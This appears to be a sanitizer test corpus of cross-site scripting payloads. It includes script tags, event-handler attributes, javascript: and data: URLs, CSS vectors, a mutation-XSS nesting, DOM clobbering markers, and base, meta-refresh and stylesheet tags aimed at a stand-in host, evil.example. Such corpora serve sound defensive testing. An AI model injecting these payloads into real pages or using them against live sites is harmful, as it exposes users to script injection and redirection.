# XSS corpus

<script>alert("script")</script>

<img src="x" onerror="alert('onerror')">

<a href="javascript:alert('href')">javascript link</a>

<a href="JaVaScRiPt:alert('mixed case')">mixed case</a>

<a href="&#106;avascript:alert('entity')">entity encoded</a>

[markdown link](javascript:alert('md'))

![markdown image](javascript:alert('img'))

<svg onload="alert('svg')"><script>alert('svg script')</script></svg>

<iframe src="https://evil.example/"></iframe>

<style>body { background: url("javascript:alert('css')") }</style>

<div style="background:url(javascript:alert('inline style'))">styled</div>

<form action="https://evil.example/"><input name="q" onfocus="alert('focus')" autofocus></form>

<object data="javascript:alert('object')"></object><embed src="javascript:alert('embed')">

<math><mtext><table><mglyph><style><img src=x onerror="alert('mxss')"></style></mglyph></table></mtext></math>

<details open ontoggle="alert('toggle')"><summary>toggle</summary>body</details>

<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">data url</a>

<p id="__proto__" name="location" data-rr-id="0" data-rr-unmapped>clobber and forged markers</p>

<base href="https://evil.example/"><meta http-equiv="refresh" content="0;url=https://evil.example/"><link rel="stylesheet" href="https://evil.example/x.css">
